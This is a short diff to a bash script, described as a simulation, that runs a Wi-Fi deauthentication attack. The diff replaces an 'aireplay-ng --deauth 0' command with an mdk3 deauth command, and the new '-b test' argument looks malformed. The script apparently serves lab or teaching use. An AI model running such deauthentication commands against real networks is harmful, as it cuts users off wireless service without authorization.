@@ -1,7 +1,7 @@
 #!/bin/bash
 # Perform a simulation of a Wi-Fi deauthentication attack using aircrack-ng
 # Dependencies:
-# - https://github.com/aircrack-ng/aircrack-ng
+# - https://salsa.debian.org/pkg-security-team/mdk3
 
 BOLD="\e[1m"
 RED="\e[0;31m"
@@ -53,6 +53,7 @@ echo -e
 echo -e "Performing deauthentication attack on WAP ${BOLD}${BSSID}${NORMAL} using interface ${BOLD}${INTERFACE_NAME_MONITOR}${NORMAL}"
 read -n 1 -s -r -p "Press any key to continue..."
 echo -e
-sudo aireplay-ng --deauth 0 -a "${BSSID}" "${INTERFACE_NAME_MONITOR}"
+sudo mdk3 "${INTERFACE_NAME_MONITOR}" d -b "test"
+echo -e
 
 echo -e "${GREEN}Deauthentication attack executed. View data with ${BOLD}Wireshark${NORMAL}.${NORMAL}"
